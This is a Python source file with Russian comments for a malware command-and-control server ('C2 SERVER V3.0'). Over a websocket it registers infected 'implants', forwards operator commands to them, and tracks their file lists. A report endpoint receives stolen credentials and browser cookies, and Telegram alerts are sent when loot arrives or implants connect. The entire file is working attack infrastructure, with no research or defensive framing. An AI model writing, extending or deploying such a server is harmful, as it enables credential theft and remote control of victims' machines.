# --- Файл: c2_server.py (Версия 3.0 с API для отчетов) ---
import asyncio, json, os, threading, urllib.parse, urllib.request
from aiohttp import web
from utils import send_telegram_message # Используем общую функцию

IMPLANTS, OPERATOR = {}, None

async def handle_report(request):
    try:
        data = await request.json()
        bot_id = data.get("bot_id", "Unknown")
        report_type = data.get("type", "report")
        hostname = bot_id.replace("implant_", "")

        if report_type == "heist_report":
            creds = data.get("credentials")
            cookies = data.get("cookies")
            if creds and len(creds) > 50:
                 send_telegram_message(f"🔑 Получены учетки от {hostname}")
                 # Тут можно сохранить в файл, если нужно
            if cookies and len(cookies) > 50:
                 send_telegram_message(f"🍪 Получены куки от {hostname}")
                 # Тут можно сохранить в файл, если нужно
        elif report_type == "recon_report":
            send_telegram_message(f"💻 Получен системный отчет от {hostname}")
            # Тут можно сохранить в файл

        print(f"[+] Получен отчет '{report_type}' от {bot_id}")
        return web.Response(status=200, text="Report received")
    except Exception as e:
        print(f"[!] Ошибка обработки отчета: {e}")
        return web.Response(status=500, text="Server error")

async def websocket_handler(request):
    global OPERATOR, IMPLANTS
    ws = web.WebSocketResponse(); await ws.prepare(request)
    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = {"ws": ws, "files": initial_msg.get('files', {}), "volume": initial_msg.get('current_volume', 50)}
            print(f"[+] Новый имплант онлайн: {client_id}"); send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}"); await broadcast_bot_list()
        else:
            await ws.close(); return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping': await ws.send_str('pong'); continue
                data = json.loads(msg.data)
                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        details = {"files": IMPLANTS[target_id].get("files"), "volume": IMPLANTS[target_id].get("volume")}
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
                elif client_type == 'implant':
                    if data.get('type') == 'file_list_update':
                        if client_id in IMPLANTS:
                            IMPLANTS[client_id]["files"] = data.get('files', {})
                            if OPERATOR: await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': {"files": data.get('files')}})

    except Exception: pass # Игнорируем ошибки отключения
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]; print(f"[-] Имплант отключился: {client_id}"); send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}"); await broadcast_bot_list()
        elif client_type == 'operator': OPERATOR = None; print("[-] Оператор отключился.")
    return ws

async def broadcast_bot_list():
    if OPERATOR and not OPERATOR.closed: await OPERATOR.send_json({'type': 'bot_list', 'data': list(IMPLANTS.keys())})

async def http_handler(request): return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    app.router.add_post('/api/report', handle_report) # <-- Добавлен новый маршрут
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 10000)
    await site.start()
    print("====== C2 SERVER (V3.0) ONLINE ======"); send_telegram_message("🚀 Сервер запущен.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: print("\nСервер остановлен.")
    finally: send_telegram_message("🛑 Сервер остановлен.")
